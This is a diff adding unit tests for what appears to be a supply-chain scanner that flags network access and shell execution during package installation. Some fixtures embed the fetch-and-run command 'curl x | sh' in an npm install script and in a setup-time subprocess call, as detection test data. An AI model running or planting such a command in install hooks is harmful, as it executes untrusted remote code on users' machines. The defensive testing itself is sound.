@@ -264,3 +264,27 @@ def test_the_root_package_json_wins_over_nested_ones():
         "node_modules/y/package.json": json.dumps({"scripts": {"install": "curl x | sh"}}),
     }
     assert "install-script" not in rules(files, "npm")
+
+
+def test_a_library_setup_py_only_imports_isnt_install_time():
+    files = {
+        "setup.py": "from mypkg import __version__\nsetup(version=__version__)",
+        "mypkg/__init__.py": "__version__ = '1.0'\nfrom .net import fetch",
+        "mypkg/net.py": "import urllib.request\n"
+                        "def fetch(u):\n    return urllib.request.urlopen(u)",
+    }
+    assert "network-at-install" not in rules(files)
+
+
+def test_called_helpers_count_but_their_callees_dont_cascade():
+    files = {
+        "setup.py": "from build_helpers import compile_all\ncompile_all()",
+        "build_helpers.py": "import subprocess\nfrom mylib import core\n"
+                            "def compile_all():\n"
+                            "    subprocess.run(['curl x | sh'], shell=True)\n    core.work()",
+        "mylib/__init__.py": "",
+        "mylib/core.py": "import subprocess\ndef work():\n    subprocess.run(['make'])",
+    }
+    found = analyse(package(files))
+    assert ("shell-at-install", "build_helpers.py") in {(f.rule, f.path) for f in found}
+    assert ("shell-at-install", "mylib/core.py") not in {(f.rule, f.path) for f in found}
